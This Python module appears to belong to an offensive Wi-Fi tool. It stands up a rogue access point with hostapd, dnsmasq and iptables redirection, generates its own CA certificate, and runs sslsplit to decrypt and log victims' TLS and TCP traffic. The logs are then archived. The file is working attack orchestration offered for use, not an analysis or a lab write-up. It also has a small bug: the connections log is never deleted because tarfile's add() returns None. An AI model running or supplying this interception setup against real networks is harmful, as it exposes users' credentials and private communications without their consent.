# coding=utf-8
import os
import style
import subprocess
import iptables
import net
import dnsmasq
import hostapd
import tarfile

from os.path import isfile, basename, isdir
from os import unlink, listdir, mkdir

SSL_PORT = '8443'
TCP_PORT = '8080'

MAIN_DIR = '/root/.wirecamel/sslsplit/'
KEYS_DIR = '/root/.wirecamel/sslsplit/keys/'
LOGS_DIR = '/root/.wirecamel/sslsplit/logs/'
SAVE_DIR = '/root/.wirecamel/sslsplit/saved_logs/'
CONN_FILE = '/root/.wirecamel/sslsplit/connections.log'

XTERM_TITLE = 'SSLSplit Console'


# Create the sslsplit directory structure
def create_structure():
    # Checking that directory doesn't exists (if already exists, was created by this script)
    if not isdir(MAIN_DIR):
        style.warning("SSLSplit structure missing, creating it...")
        mkdir(MAIN_DIR)     # Creating main directory
        mkdir(KEYS_DIR)     # Creating certs directory
        mkdir(LOGS_DIR)     # Creating logs directory
        mkdir(SAVE_DIR)     # Creating the save directory


# Generate certificates for ssl split
def generate_certs():
    # No need to generate if already exists
    if isfile("{}ca.key".format(KEYS_DIR)) and isfile("{}ca.crt".format(KEYS_DIR)):
        return

    # Private key
    style.loading("Generating private key...")
    p = subprocess.Popen(
        "openssl genrsa -out {}ca.key 4096".format(KEYS_DIR).split(" "),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    p.wait()

    # Public key
    style.loading("Generating public key...")
    p = subprocess.Popen(
        "openssl req -new -x509 -days 1826 -out {}ca.crt -key {}ca.key -subj /CN=wirecamel".format(
            KEYS_DIR,
            KEYS_DIR
        ).split(" "),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    p.wait()


# Start SSL Split
def start(interface):
    # Checking processes with airmon-ng
    res = net.kill_unwanted()
    style.print_call_info(res, "airmon-ng", "Killed unwanted processes.")

    # Unblocking wifi if needed
    res = net.check_rfkill()
    style.print_call_info(res, "rfkill", "Unblocked Wifi (Soft and Hardware mode)")

    # Saving actual iptables rules to restore it after stopping the ap
    iptables.save_rules()
    style.checked('Saved actual iptables rules')

    # Flushing iptables
    res = iptables.flush_nat()
    style.print_call_info(res, 'iptables', 'Flushed iptables rules')

    # Setting interface to listen on for dnsmasq
    dnsmasq.write_conf(interface)

    # Starting dnsmasq service
    res = dnsmasq.start()
    style.print_call_info(res, 'dnsmasq', 'Started dnsmasq service')

    # Loading iptables rules for SSLSplit and hostapd
    res = iptables.restore(iptables.SSLSPLIT_CONF)
    style.print_call_info(res, 'iptables', 'Updated iptables rules for SSL Split')

    # Confiuguring interface
    res = net.configure_interface(interface)
    style.print_call_info(res, "ifconfig", "Configured interface")

    # Enabling IP forward
    res = net.ip_forward(enable=True)
    style.print_call_info(res, "ip_forward", "Enabled IP forwarding")

    # Starting hostapd
    subhostapd = hostapd.start()
    style.print_call_info(0, "hostapd", "Started hostapd")

    # Starting SSL Split
    subssl = subprocess.Popen(
        [
            'xterm', '-T', XTERM_TITLE, '-e',

            'sslsplit', '-D',
            '-l', CONN_FILE,
            '-S', LOGS_DIR,
            '-k', "{}/ca.key".format(KEYS_DIR),
            '-c', "{}/ca.crt".format(KEYS_DIR),
            'ssl', '0.0.0.0', SSL_PORT,
            'tcp', '0.0.0.0', TCP_PORT
        ]
    )
    style.print_call_info(0, "sslsplit", "Started SSLSplit")

    return subhostapd, subssl


# Stop SSL Split
def stop(subssl, subhostapd, restart_nm=False):
    # Checking subssl
    if not isinstance(subssl, subprocess.Popen):
        raise Exception("[subssl] not a process. Aborting")

    # Checking subhostapd
    if not isinstance(subhostapd, subprocess.Popen):
        raise Exception("[subhostapd] not a process. Aborting")

    # Stopping processes (hostapd & sslsplit)
    subssl.kill()
    subhostapd.kill()

    # Disabling ip forwarding
    res = net.ip_forward(enable=False)
    style.print_call_info(res, 'ip_forward', 'Disabled IP forwarding')

    # Stopping dnsmasq
    res = dnsmasq.stop()
    style.print_call_info(res, 'dnsmasq', 'Stopped dnsmasq')

    # Restoring iptables rules
    res = iptables.restore(iptables.TMP_RULES)
    style.print_call_info(res, 'iptables', 'Restored iptables rules')

    # Removing tmp file
    unlink(iptables.TMP_RULES)

    # Restarting NetworkManager (if it was running initially)
    if restart_nm:
        res = subprocess.call(
            ['systemctl', 'start', 'NetworkManager']
        )
        style.print_call_info(res, 'NetworkManager', 'Restarted NetworkManager')


# Make a backup of all logs
def save_logs(filename):
    # Checking if dir is empty
    if len(listdir(LOGS_DIR)) == 0:
        return False

    # Opening the new tarfile
    with tarfile.open("{}{}.gz".format(SAVE_DIR, filename), 'w:gz') as tar:
        # Adding logs directory
        tar.add(LOGS_DIR, arcname=basename(LOGS_DIR))

        # Adding connections.log file
        conn_file_added = tar.add(CONN_FILE, arcname='connections.log') if isfile(CONN_FILE) else None

    # Removing files
    for filetoremove in listdir(LOGS_DIR):
        # if isfile("{}{}".format(LOGS_DIR, filetoremove)):
        unlink("{}{}".format(LOGS_DIR, filetoremove))

    # Removing connections log file
    if conn_file_added:
        unlink(CONN_FILE)
